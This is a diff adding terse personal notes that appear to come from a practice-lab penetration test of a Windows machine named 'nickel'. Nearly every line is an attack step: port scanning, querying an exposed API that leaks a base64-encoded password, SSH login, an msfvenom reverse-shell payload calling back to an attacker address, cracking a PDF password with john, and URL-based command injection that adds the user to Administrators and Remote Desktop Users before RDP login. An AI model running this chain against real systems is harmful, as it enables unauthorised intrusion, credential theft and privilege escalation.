@@ -1,0 +1,54 @@
+nickel
+
+nmap  192.168.123.99  
+
+
+http://192.168.123.99:8089/
+
+curl http://192.168.123.99:33333/list-current-deployments
+curl -X POST -H "Content-Type:html/txt" http://192.168.123.99:33333/list-current-deployments
+ curl -X POST -H "Content-Length:0" http://192.168.123.99:33333/list-current-deployments
+ curl -X POST -H "Content-Length:0" http://192.168.123.99:33333/list-running-procs  
+ curl -X POST -H "Content-Length:0" http://192.168.123.99:33333/list-active-nodes
+ 
+ commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
+              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+
+username ariah
+password NowiseSloopTheory139 (after decoding base 64)
+ssh ariah@192.168.123.99
+ssh ariah@192.168.57.99
+
+192.168.57.99
+
+NowiseSloopTheory139
+86c8f76d44e9e39d4891998f69114323
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.57 LPORT=80 -f exe > shell.exe
+
+scp shell.exe ariah@192.168.57.99:C:/users/ariah/
+
+No need to run because I have already a shell with same priv
+
+net user
+scp ariah@192.168.57.99:C:/ftp/Infrastructure.pdf .
+pdf2john Infrastructure.pdf >hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+ariah4168        (Infrastructure.pdf) 
+
+Invoke-WebRequest 'http://nickel/?whoami' -UseBasicParsing
+$Resp = Invoke-WebRequest 'http://nickel/?whoami' -UseBasicParsing
+$Resp.RawContent
+
+curl http://nickel/?whoami
+curl http://nickel/?net%20user%0A
+net localgroup Administrators ariah /add
+
+curl http://nickel/?net%20localgroup%20Administrators%20ariah%20%2Fadd
+net localgroup 'Remote Desktop Users' ariah /add
+curl http://nickel/?net%20localgroup%20%27Remote%20Desktop%20Users%27%20ariah%20%2Fadd
+
+xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'ariah' /p:'NowiseSloopTheory139' /v:192.168.57.99
+
+net user ariah
